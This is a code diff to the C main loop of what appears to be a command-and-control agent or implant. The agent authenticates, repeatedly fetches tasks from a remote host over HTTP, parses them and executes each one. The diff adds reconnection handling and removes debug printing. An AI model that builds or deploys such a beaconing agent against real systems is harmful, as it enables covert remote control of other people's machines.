@@ -10,14 +10,6 @@
 
 #include <config.h>
 
-#define PRINT_HEX( b, l )                               \
-    printf( #b ": [%d] [ ", l );                        \
-    for ( int i = 0 ; i < l; i++ )                      \
-    {                                                   \
-        printf( "%02x ", ( ( PUCHAR ) b ) [ i ] );      \
-    }                                                   \
-    puts( "]" );
-
 struct Agent agent;
 
 int main() {
@@ -32,16 +24,20 @@ int main() {
   char* tasksBuffer = malloc(1024);
 
   while (1) {  
-    authenticate();
-    while (1) {
+    agent.connected = (bool)authenticate();
+    
+    while (agent.connected) {
       printf("fetching commands..\n");
 
-      httpGet(host, port, agent.report_uri, 1024, &httpBytesRead, tasksBuffer);
+      if (!httpGet(host, port, agent.report_uri, 1024, &httpBytesRead, tasksBuffer)) {
+        agent.connected = false;
+        break;
+      }
       tasksBuffer[httpBytesRead] = 0x00;
-      tasksTLV.allocsize = 1024;
-      tasksTLV.buf = tasksBuffer;
-      tasksTLV.bufsize = httpBytesRead;
-      tasksTLV.read_cursor = 0;
+
+      printf("%s", tasksBuffer);
+
+      tasksTLV = tlvFromBuf(tasksBuffer, httpBytesRead);
 
       int tasksCount = extractInt32(&tasksTLV);
       extractInt32(&tasksTLV); // size of the tasks buffer, useless for us.
@@ -56,12 +52,6 @@ int main() {
         args[argBytes] = 0x00;
 
         struct TLVBuild tlvArgs = tlvFromBuf(args, argBytes + 1);
-        // tlvArgs.read_cursor = 0;
-        // tlvArgs.buf = args;
-        // tlvArgs.bufsize = argBytes + 1;
-        // tlvArgs.allocsize = argBytes + 1;
-        // PRINT_HEX(tlvArgs.buf, tlvArgs.bufsize);
-
         executeCmd(taskActionId, taskId, extractInt32(&tlvArgs), &tlvArgs);
 
         free(args);
